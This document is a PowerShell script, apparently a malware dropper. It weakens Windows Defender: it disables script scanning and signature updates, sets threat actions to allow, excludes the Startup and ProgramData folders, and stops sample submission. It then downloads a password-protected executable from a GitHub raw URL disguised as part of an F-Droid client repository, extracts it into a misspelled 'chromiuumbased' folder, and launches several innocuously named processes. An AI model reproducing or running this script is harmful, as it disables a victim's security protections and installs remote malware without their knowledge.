$ErrorActionPreference = 'SilentlyContinue'
$ProcName = "additionlibraries.exe"
$WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
$Outff = "$env:Temp\additionlibraries.exe"

Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
Set-MpPreference -DisableScriptScanning $true -Force
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6 -Force
$vrer4 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$vrer1 = "C:\ProgramData"
Add-MpPreference -ExclusionProcess serverCommon.exe -Force
Add-MpPreference -ExclusionPath "$vrer4" -Force
Add-MpPreference -ExclusionPath "$vrer1" -Force
Invoke-WebRequest -uri $WebFile -OutFile $Outff
& $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
Timeout /T 5
Start-Process ("$env:APPDATA\chromiuumbased\services\ProcManager.exe")
Timeout /T 5
Start-Process ("$env:APPDATA\chromiuumbased\services\netDaemon.exe")
Timeout /T 5
Start-Process ("$env:APPDATA\chromiuumbased\services\Netstservice.exe")
Timeout /T 5
Start-Process ("$env:APPDATA\chromiuumbased\services\Updmonitor.exe")
Set-MpPreference -SubmitSamplesConsent 0 -Force
Set-MpPreference -SignatureScheduleDay 8 -Force
Set-MpPreference -ScanScheduleDay 8 -Force
Set-MpPreference -SevereThreatDefaultAction Allow -Force
Set-MpPreference -ScanParameters 2 -Force
Set-MpPreference -RemediationScheduleDay 8 -Force
Set-MpPreference -HighThreatDefaultAction Allow -Force
Set-MpPreference -DisableCatchupQuickScan $False -Force
